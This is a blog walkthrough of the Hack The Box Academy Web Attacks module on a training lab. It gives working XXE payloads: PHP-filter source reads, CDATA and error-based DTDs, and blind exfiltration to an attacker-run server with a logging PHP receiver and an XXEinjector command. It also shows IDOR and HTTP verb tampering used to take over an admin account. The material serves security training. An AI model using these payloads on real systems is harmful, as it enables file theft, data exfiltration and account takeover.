---
layout: post
title:  "Hack The Box - Academy - Web Attacks"
description: "Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection and  elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-11-12 19:31
image:  /images/htb/web-attacks/logo.png
tags:   [httb-verb-tampering,idor,xxe,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection

>
<b>References:</b>
<br/>
<a href="https://academy.hackthebox.com/module/134/section/1158">Web Attacks</a><br/>
<a href="https://jacozwarts.github.io/images/htb/web-attacks/Web_Attacks_Module_Cheat_Sheet.pdf">Web Attacks - Cheat Sheet</a><br/>

# Notes:

### XXE

#### Read PHP source code with `base64` encode filter

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>Test</name>
<tel>01234566789</tel>
<email>&company;</email>
<message>Testing form</message>
</root>
```

#### Advanced File Disclosure - Exercise
<a href="https://academy.hackthebox.com/module/134/section/1206">Hack The Box - Advanced File Disclosure</a><br/>

##### CDATA
`CDATA` is used to output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

`Below explanation is extracted from Hack The Box Web Attacks - CDATA:`

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.

1. Create dtd file:
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```
2. Start python web server on port 8000
```
python3 -m http.server 8000
```
3. Send updated payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///flag.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://{IP_ADDRESS}:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```
![XXE CDATA Result](/images/htb/web-attacks/xxe_cdata.png)

##### Error Based


`Extracted from Hack The Box Web Attacks - Error Based XXE`

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.


Steps to read the `flag.php` using `Error Based` XXE:
1. Inject and invalid parameter to see if errors are returned.

![XXE Error Based Request](/images/htb/web-attacks/xxe_error_based.png)

2. Create a dtd file with the below payload:

```
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

3. Create a python webserver
```
python3 -m http.server 8000
```

4. Send the below request to read flag.php
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.205:8000/xxe_error.dtd">
  %remote;
  %error;
]><root>
<name>Error based XXE</name>
<tel>0123456789</tel>
<email>test@gmail.com</email>
<message>Testing for Error based XXE</message>
</root>
```

![XXE Error Based Result](/images/htb/web-attacks/xxe_error_based_result.png)
<hr/>

#### Blind Data Exfiltration - Exercise

##### Manual:

1. Create the dtd file to exfiltrate the flag:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/{Flag_file.php}">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{YOUR_IP_ADDRESS}:8000/?content=%file;'>">
```

2. Create the php file to display the request's content:
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

3. Start the PHP server:
```
php -S 0.0.0.0:8000
```

4. Submit the payload to trigger the Blind Data Exfiltration:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://{YOUR_IP_ADDRESS}:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

<hr/>

##### Using <a href="https://github.com/enjoiz/XXEinjector">XXEInjector</a>:
1. Save request from proxy to a file `xxe.req`
2. Execute below command to run XXEInjector:
```
ruby XXEinjector.rb --host={YOUR_IP_ADDRESS} --httpport=8000 --file=/tmp/xxe.req --path=/{FLAG_FILE.php} --oob=http --phpfilter
```

<hr/>

## Skills Assessment
><b>Overview:</b>
You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.<br/><br/>The login details are provided in the question below.<br/><br/>

### Ensure that Caido’s proxy is intercepting all requests.

### Log In to the Application

Log in using the provided credentials.

![Login](/images/htb/web-attacks/sa-login-page.png)

### Explore Application Functionality

![Dashboard](/images/htb/web-attacks/sa-dashboard.png)

Explore the application’s features, especially the `Settings` page with a password reset option.
### Review Login Requests in Caido

![Caido Requests](/images/htb/web-attacks/sa-requests.png)

Review the captured requests in Caido:
 - Observe a 301 Redirect response following a successful login.
 - Notice a 200 OK response loading profile.php, which fetches user data via api.php.
 - There’s also a 200 OK response for loading Settings.php.
 - Next, there’s an API GET call fetching a user token and a POST request to reset the password.

### Investigate for Potential IDOR

- Notice that the API calls include the user ID as a parameter, which could lead to an Insecure Direct Object Reference (IDOR) vulnerability.
- Test this by modifying the api.php/user/ endpoint in Caido to see if we can access data of other users.

![User Endpoint IDOR Configuration](/images/htb/web-attacks/sa-userapi-idor-configuration.png)

![User Endpoint IDOR Result](/images/htb/web-attacks/sa-userapi-idor-result.png)

### Enumerate Users with Caido's HTTPQL Query

- Use Caido’s `HTTPQL query` feature to search for an admin user.

![Admin details](/images/htb/web-attacks/sa-userapi-idor-admin.png)

### Attempt Password Reset for Admin User

- With the admin user ID, we'll attempt to retrieve the token by exploiting the `api.php/token` endpoint and initiate a password reset for the admin account.

![Admin Token](/images/htb/web-attacks/sa-admin-token.png)

- Looking at our reset password request we'll have to update the uid and the token to the `Admin` user's uid and token.

![Reset Password Request](/images/htb/web-attacks/sa-resetpassword-request.png)

- After updating the request to the admin details. Notice we get an error `Access Denied`, we'll bypassing this restriction using HTTP verb tampering.

![Admin Reset - Access Denied](/images/htb/web-attacks/sa-resetpassword-access-denied.png)

### Bypass Authorization with Verb Tampering

- Change the HTTP method to PUT, notice the error `Missing Parameter`.
![HTTP Verb Tampering](/images/htb/web-attacks/sa-verb-tampering-put-missing-parameters.png)


- We'll add the parameters as query parameters and retry.

![HTTP Verb Tampering - Result](/images/htb/web-attacks/sa-admin-password-changed.png)

### Access and Explore Admin Features

- Once logged in as the admin, notice the new feature `Add Event`.

![Admin Portald](/images/htb/web-attacks/sa-admin-portal.png)

### Exploit XXE Vulnerability in Event Creation

- Create a new event, then review the Caido logs for the associated request.

![Creating new event UI](/images/htb/web-attacks/sa-new-event-ui.png)

![Creating new event Request](/images/htb/web-attacks/sa-new-event-request.png)

- Analyzing the response we can see the `name` property in the response.

### Attempt XXE Exploit with PHP Filtering
- Since the application appears to be PHP-based, try PHP filtering to read server files.
- Start by attempting to read `index.php` to confirm access.

Use the below payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/index.php">
]>
            <root>
            <name>&Test;</name>
            <details>test</details>
            <date></date>
            </root>
```

![PHP Filter](/images/htb/web-attacks/sa-reading-index-content.png)

### Retrieve Flag
- We'll modify the payload to read `flag.php`.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
            <root>
            <name>&Test;</name>
            <details>test</details>
            <date></date>
            </root>
```

![Reading flag](/images/htb/web-attacks/sa-reading-flag.png)
<hr/>